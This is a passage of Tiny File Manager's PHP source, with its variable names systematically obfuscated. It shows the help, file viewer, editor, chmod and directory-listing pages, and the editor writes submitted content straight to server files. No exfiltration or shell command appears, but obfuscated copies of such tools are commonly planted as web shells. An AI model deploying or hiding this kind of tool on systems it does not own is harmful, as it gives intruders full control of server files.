                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo lng('HideColumns') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $v89e0b6be ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo lng('Theme') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php if($vb6b826ad == "light"){echo "selected";} ?>><?php echo lng('light') ?></option>
                                <option value='dark' <?php if($vb6b826ad == "dark"){echo "selected";} ?>><?php echo lng('dark') ?></option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo lng('Save'); ?></button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($v51e4dd52['help'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $ve4627ce1, $vdcd4149e;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('Help') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION; ?></a></h3></p>
                        <p>Author: Prasath Mani</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash') ?></a></li>
                                <?php } ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo lng('Generate new password hash') ?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php echo lng('Password') ?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password') ?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo lng('Generate') ?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

// file viewer
if (isset($v51e4dd52['view'])) {
    $v81f430be = $v51e4dd52['view'];
    $v81f430be = fm_clean_path($v81f430be, false);
    $v81f430be = str_replace('/', '', $v81f430be);
    if ($v81f430be == '' || !is_file($v5424ec5f . '/' . $v81f430be) || in_array($v81f430be, $vcefcaa66['exclude_items'])) {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $v4e91cff7 = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v81f430be);
    $v6314089b = $v5424ec5f . '/' . $v81f430be;

    $v00b4247d = strtolower(pathinfo($v6314089b, PATHINFO_EXTENSION));
    $va0147af0 = fm_get_mime_type($v6314089b);
    $v8cd35c7d = fm_get_size($v6314089b);
    $v6d2ed810 = fm_get_filesize($v8cd35c7d);

    $vb6e0e42e = false;
    $vb4953a2f = false;
    $v0413a9db = false;
    $v514aacb0 = false;
    $v2076edab = false;
    $v8791a3d6 = false;
    $v416af2b7 = false;

    $v76369aca = 'File';
    $va4575d81 = false; // for zip
    $v920ebed6 = ''; // for text
    $v3065d34d = strtolower(FM_DOC_VIEWER);

    if($v3065d34d && $v3065d34d !== 'false' && in_array($v00b4247d, fm_get_onlineViewer_exts())){
        $v416af2b7 = true;
    }
    elseif ($v00b4247d == 'zip' || $v00b4247d == 'tar') {
        $vb6e0e42e = true;
        $v76369aca = 'Archive';
        $va4575d81 = fm_get_zif_info($v6314089b, $v00b4247d);
    } elseif (in_array($v00b4247d, fm_get_image_exts())) {
        $v0413a9db = true;
        $v76369aca = 'Image';
    } elseif (in_array($v00b4247d, fm_get_audio_exts())) {
        $v514aacb0 = true;
        $v76369aca = 'Audio';
    } elseif (in_array($v00b4247d, fm_get_video_exts())) {
        $v2076edab = true;
        $v76369aca = 'Video';
    } elseif (in_array($v00b4247d, fm_get_text_exts()) || substr($va0147af0, 0, 4) == 'text' || in_array($va0147af0, fm_get_text_mimes())) {
        $v8791a3d6 = true;
        $v920ebed6 = file_get_contents($v6314089b);
    }

    ?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php echo lng($v76369aca) ?> "<?php echo fm_enc(fm_convert_win($v81f430be)) ?>"</b></p>
            <p class="break-word">
                <?php $ve4cbcb76 = fm_get_display_path($v6314089b); ?>
                <strong><?php echo $ve4cbcb76['label']; ?>:</strong> <?php echo $ve4cbcb76['path']; ?><br>
                <strong>File size:</strong> <?php echo ($v8cd35c7d <= 1000) ? "$v8cd35c7d bytes" : $v6d2ed810; ?><br>
                <strong>MIME-type:</strong> <?php echo $va0147af0 ?><br>
                <?php
                // ZIP info
                if (($vb6e0e42e || $vb4953a2f) && $va4575d81 !== false) {
                    $v8aa91af1 = 0;
                    $v668a0ca6 = 0;
                    $v0e94cf17 = 0;
                    foreach ($va4575d81 as $v7b65bba6) {
                        if (!$v7b65bba6['folder']) {
                            $v8aa91af1++;
                        }
                        $v668a0ca6 += $v7b65bba6['compressed_size'];
                        $v0e94cf17 += $v7b65bba6['filesize'];
                    }
                    ?>
                    <?php echo lng('Files in archive') ?>: <?php echo $v8aa91af1 ?><br>
                    <?php echo lng('Total size') ?>: <?php echo fm_get_filesize($v0e94cf17) ?><br>
                    <?php echo lng('Size in archive') ?>: <?php echo fm_get_filesize($v668a0ca6) ?><br>
                    <?php echo lng('Compression') ?>: <?php echo round(($v668a0ca6 / max($v0e94cf17, 1)) * 100) ?>%<br>
                    <?php
                }
                // Image info
                if ($v0413a9db) {
                    $v4f4f9532 = getimagesize($v6314089b);
                    echo '<strong>'.lng('Image size').':</strong> ' . (isset($v4f4f9532[0]) ? $v4f4f9532[0] : '0') . ' x ' . (isset($v4f4f9532[1]) ? $v4f4f9532[1] : '0') . '<br>';
                }
                // Text info
                if ($v8791a3d6) {
                    $v28374a08 = fm_is_utf8($v920ebed6);
                    if (function_exists('iconv')) {
                        if (!$v28374a08) {
                            $v920ebed6 = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $v920ebed6);
                        }
                    }
                    echo '<strong>'.lng('Charset').':</strong> ' . ($v28374a08 ? 'utf-8' : '8 bit') . '<br>';
                }
                ?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($v81f430be) ?>">
                    <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo lng('Download') ?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php echo fm_enc($v4e91cff7) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo lng('Open') ?></a></b>
                <?php
                // ZIP actions
                if (!FM_READONLY && ($vb6e0e42e || $vb4953a2f) && $va4575d81 !== false) {
                    $va0de9294 = pathinfo($v6314089b, PATHINFO_FILENAME);
                    ?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($v81f430be); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip') ?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($v81f430be); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fm_enc($va0de9294) ?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder') ?></button>
                    </form>&nbsp;
                    <?php
                }
                if ($v8791a3d6 && !FM_READONLY) {
                    ?>
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($v81f430be) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo lng('Edit') ?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($v81f430be) ?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?>
                        </a></b> &nbsp;
                <?php } ?>
                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back') ?></a></b>
            </div>
            <?php
            if($v416af2b7) {
                if($v3065d34d == 'google') {
                    echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fm_enc($v4e91cff7) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                } else if($v3065d34d == 'microsoft') {
                    echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fm_enc($v4e91cff7) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                }
            } elseif ($vb6e0e42e) {
                // ZIP content
                if ($va4575d81 !== false) {
                    echo '<code class="maxheight">';
                    foreach ($va4575d81 as $v7b65bba6) {
                        if ($v7b65bba6['folder']) {
                            echo '<b>' . fm_enc($v7b65bba6['name']) . '</b><br>';
                        } else {
                            echo $v7b65bba6['name'] . ' (' . fm_get_filesize($v7b65bba6['filesize']) . ')<br>';
                        }
                    }
                    echo '</code>';
                } else {
                    echo '<p>'.lng('Error while fetching archive info').'</p>';
                }
            } elseif ($v0413a9db) {
                // Image content
                if (in_array($v00b4247d, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
                    echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fm_enc($v4e91cff7) . '" alt="image" class="preview-img"></label></p>';
                }
            } elseif ($v514aacb0) {
                // Audio content
                echo '<p><audio src="' . fm_enc($v4e91cff7) . '" controls preload="metadata"></audio></p>';
            } elseif ($v2076edab) {
                // Video content
                echo '<div class="preview-video"><video src="' . fm_enc($v4e91cff7) . '" width="640" height="360" controls preload="metadata"></video></div>';
            } elseif ($v8791a3d6) {
                if (FM_USE_HIGHLIGHTJS) {
                    // highlight
                    $v6ab47925 = array(
                        'shtml' => 'xml',
                        'htaccess' => 'apache',
                        'phtml' => 'php',
                        'lock' => 'json',
                        'svg' => 'xml',
                    );
                    $v3dc2cc35 = isset($v6ab47925[$v00b4247d]) ? 'lang-' . $v6ab47925[$v00b4247d] : 'lang-' . $v00b4247d;
                    if (empty($v00b4247d) || in_array(strtolower($v81f430be), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $v81f430be)) {
                        $v3dc2cc35 = 'nohighlight';
                    }
                    $v920ebed6 = '<pre class="with-hljs"><code class="' . $v3dc2cc35 . '">' . fm_enc($v920ebed6) . '</code></pre>';
                } elseif (in_array($v00b4247d, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                    // php highlight
                    $v920ebed6 = highlight_string($v920ebed6, true);
                } else {
                    $v920ebed6 = '<pre>' . fm_enc($v920ebed6) . '</pre>';
                }
                echo $v920ebed6;
            }
            ?>
        </div>
    </div>
    <?php
        fm_show_footer();
    exit;
}

// file editor
if (isset($v51e4dd52['edit']) && !FM_READONLY) {
    $v81f430be = $v51e4dd52['edit'];
    $v81f430be = fm_clean_path($v81f430be, false);
    $v81f430be = str_replace('/', '', $v81f430be);
    if ($v81f430be == '' || !is_file($v5424ec5f . '/' . $v81f430be) || in_array($v81f430be, $vcefcaa66['exclude_items'])) {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }
    $v78847cbe = ' : <i><b>'. $v81f430be. '</b></i>';
    header('X-XSS-Protection:0');
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $v4e91cff7 = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v81f430be);
    $v6314089b = $v5424ec5f . '/' . $v81f430be;

    // normal editer
    $vb06f7882 = true;
    if (isset($v51e4dd52['env'])) {
        if ($v51e4dd52['env'] == "ace") {
            $vb06f7882 = false;
        }
    }

    // Save File
    if (isset($v67987c65['savedata'])) {
        $v958ab932 = $v67987c65['savedata'];
        $vc15ab669 = fopen($v6314089b, "w");
        @fwrite($vc15ab669, $v958ab932);
        fclose($vc15ab669);
        fm_set_msg(lng('File Saved Successfully'));
    }

    $v00b4247d = strtolower(pathinfo($v6314089b, PATHINFO_EXTENSION));
    $va0147af0 = fm_get_mime_type($v6314089b);
    $v6d2ed810 = filesize($v6314089b);
    $v8791a3d6 = false;
    $v920ebed6 = ''; // for text

    if (in_array($v00b4247d, fm_get_text_exts()) || substr($va0147af0, 0, 4) == 'text' || in_array($va0147af0, fm_get_text_mimes())) {
        $v8791a3d6 = true;
        $v920ebed6 = file_get_contents($v6314089b);
    }

    ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php if (!$vb06f7882) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php echo lng('Fullscreen') ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo lng('Search') ?>"><i class="fa fa-search" title="<?php echo lng('Search') ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php echo lng('Undo') ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php echo lng('Redo') ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php echo lng('Word Wrap') ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo lng('Select Mode') ?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Theme') ?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Font Size') ?> --</option></select>
                        </div>
                    <?php } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php echo urlencode($v81f430be) ?>"><i class="fa fa-reply-all"></i> <?php echo lng('Back') ?></a>
                <a title="<?php echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH)) ?>','<?php echo urlencode($v81f430be) ?>')"><i class="fa fa-database"></i> <?php echo lng('BackUp') ?></a>
                <?php if ($v8791a3d6) { ?>
                    <?php if ($vb06f7882) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($v81f430be) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($v4e91cff7) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($v81f430be) ?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($v4e91cff7) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
                        </button>
                    <?php } ?>
                <?php } ?>
            </div>
        </div>
        <?php
        if ($v8791a3d6 && $vb06f7882) {
            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($v920ebed6) . '</textarea>';
            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
        } elseif ($v8791a3d6) {
            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($v920ebed6) . '</div>';
        } else {
            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
        }
        ?>
    </div>
    <?php
    fm_show_footer();
    exit;
}

// chmod (not for Windows)
if (isset($v51e4dd52['chmod']) && !FM_READONLY && !FM_IS_WIN) {
    $v81f430be = $v51e4dd52['chmod'];
    $v81f430be = fm_clean_path($v81f430be);
    $v81f430be = str_replace('/', '', $v81f430be);
    if ($v81f430be == '' || (!is_file($v5424ec5f . '/' . $v81f430be) && !is_dir($v5424ec5f . '/' . $v81f430be))) {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $v4e91cff7 = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v81f430be;
    $v6314089b = $v5424ec5f . '/' . $v81f430be;

    $v772f173d = fileperms($v5424ec5f . '/' . $v81f430be);
    ?>
    <div class="path">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header">
                <?php echo lng('ChangePermissions') ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php $ve4cbcb76 = fm_get_display_path($v6314089b); ?>
                    <?php echo $ve4cbcb76['label']; ?>: <?php echo $ve4cbcb76['path']; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php echo fm_enc($v81f430be) ?>">

                    <table class="table compact-table <?php echo fm_get_theme(); ?>">
                        <tr>
                            <td></td>
                            <td><b><?php echo lng('Owner') ?></b></td>
                            <td><b><?php echo lng('Group') ?></b></td>
                            <td><b><?php echo lng('Other') ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Read') ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php echo ($v772f173d & 00400) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php echo ($v772f173d & 00040) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php echo ($v772f173d & 00004) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Write') ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php echo ($v772f173d & 00200) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php echo ($v772f173d & 00020) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php echo ($v772f173d & 00002) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Execute') ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php echo ($v772f173d & 00100) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php echo ($v772f173d & 00010) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php echo ($v772f173d & 00001) ? ' checked' : '' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>"> 
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Change') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

// --- TINYFILEMANAGER MAIN ---
fm_show_header(); // HEADER
fm_show_nav_path(FM_PATH); // current path

// show alert messages
fm_show_message();

$v4f0e7b67 = count($v87c5f9cc);
$v1311f5c4 = count($v3a6ba9de);
$vf6f7850d = 0;
$va588edee = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white";
?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $va588edee; ?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php if (!FM_READONLY): ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php endif; ?>
                <th><?php echo lng('Name') ?></th>
                <th><?php echo lng('Size') ?></th>
                <th><?php echo lng('Modified') ?></th>
                <?php if (!FM_IS_WIN && !$v89e0b6be): ?>
                    <th><?php echo lng('Perms') ?></th>
                    <th><?php echo lng('Owner') ?></th><?php endif; ?>
                <th><?php echo lng('Actions') ?></th>
            </tr>
            </thead>
            <?php
            // link to parent folder
            if ($ve3964bd5 !== false) {
                ?>
                <tr><?php if (!FM_READONLY): ?>
                    <td class="nosort"></td><?php endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($ve3964bd5) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php if (!FM_IS_WIN && !$v89e0b6be) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php } ?>
                </tr>
                <?php
            }
            $v9bac6a6c = 3399;
            foreach ($v3a6ba9de as $v1741b918) {
                $v3ad6d553 = is_link($v5424ec5f . '/' . $v1741b918);
                $vba6b2c9a = $v3ad6d553 ? 'icon-link_folder' : 'fa fa-folder-o';
                $ve788cf65 = filemtime($v5424ec5f . '/' . $v1741b918);
                $vd644fa8c = date(FM_DATETIME_FORMAT, $ve788cf65);
                $v6d564650 = strtotime(date("F d Y H:i:s.", $ve788cf65));
                $v8cd35c7d = "";
                $v6d2ed810 = lng('Folder');
                $v40c424b8 = substr(decoct(fileperms($v5424ec5f . '/' . $v1741b918)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $v3bd17cd7 = posix_getpwuid(fileowner($v5424ec5f . '/' . $v1741b918));
                    $v8a476006 = posix_getgrgid(filegroup($v5424ec5f . '/' . $v1741b918));
                    if ($v3bd17cd7 === false) {
                        $v3bd17cd7 = array('name' => '?');
                    }
                    if ($v8a476006 === false) {
                        $v8a476006 = array('name' => '?');
                    }
                } else {
                    $v3bd17cd7 = array('name' => '?');
                    $v8a476006 = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $v9bac6a6c ?>" name="file[]" value="<?php echo fm_enc($v1741b918) ?>">
                            <label class="custom-control-label" for="<?php echo $v9bac6a6c ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fm_convert_win(fm_enc($v1741b918)) ?>>
                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $v1741b918, '/')) ?>"><i class="<?php echo $vba6b2c9a ?>"></i> <?php echo fm_convert_win(fm_enc($v1741b918)) ?>
                            </a><?php echo($v3ad6d553 ? ' &rarr; <i>' . readlink($v5424ec5f . '/' . $v1741b918) . '</i>' : '') ?></div>
                    </td>
                    <td data-order="a-<?php echo str_pad($v8cd35c7d, 18, "0", STR_PAD_LEFT);?>">
                        <?php echo $v6d2ed810; ?>
                    </td>
                    <td data-order="a-<?php echo $v6d564650;?>"><?php echo $vd644fa8c ?></td>
                    <?php if (!FM_IS_WIN && !$v89e0b6be): ?>
                        <td><?php if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($v1741b918) ?>"><?php echo $v40c424b8 ?></a><?php else: ?><?php echo $v40c424b8 ?><?php endif; ?>
                        </td>
                        <td><?php echo $v3bd17cd7['name'] . ':' . $v8a476006['name'] ?></td>
                    <?php endif; ?>
                    <td class="inline-actions"><?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($v1741b918) ?>" onclick="confirmDailog(event, '1028','<?php echo lng('Delete').' '.lng('Folder'); ?>','<?php echo urlencode($v1741b918) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>', '<?php echo fm_enc(addslashes($v1741b918)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $v1741b918, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v1741b918 . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $v9bac6a6c++;
            }
            $v54845183 = 6070;
            foreach ($v87c5f9cc as $v1741b918) {
                $v3ad6d553 = is_link($v5424ec5f . '/' . $v1741b918);
                $vba6b2c9a = $v3ad6d553 ? 'fa fa-file-text-o' : fm_get_file_icon_class($v5424ec5f . '/' . $v1741b918);
                $ve788cf65 = filemtime($v5424ec5f . '/' . $v1741b918);
                $vd644fa8c = date(FM_DATETIME_FORMAT, $ve788cf65);
                $v6d564650 = strtotime(date("F d Y H:i:s.", $ve788cf65));
                $v8cd35c7d = fm_get_size($v5424ec5f . '/' . $v1741b918);
                $v6d2ed810 = fm_get_filesize($v8cd35c7d);
                $vd6ca99da = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($v1741b918);
                $vf6f7850d += $v8cd35c7d;
                $v40c424b8 = substr(decoct(fileperms($v5424ec5f . '/' . $v1741b918)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $v3bd17cd7 = posix_getpwuid(fileowner($v5424ec5f . '/' . $v1741b918));
                    $v8a476006 = posix_getgrgid(filegroup($v5424ec5f . '/' . $v1741b918));
                    if ($v3bd17cd7 === false) {
                        $v3bd17cd7 = array('name' => '?');
                    }
                    if ($v8a476006 === false) {
                        $v8a476006 = array('name' => '?');
                    }
                } else {
                    $v3bd17cd7 = array('name' => '?');
                    $v8a476006 = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
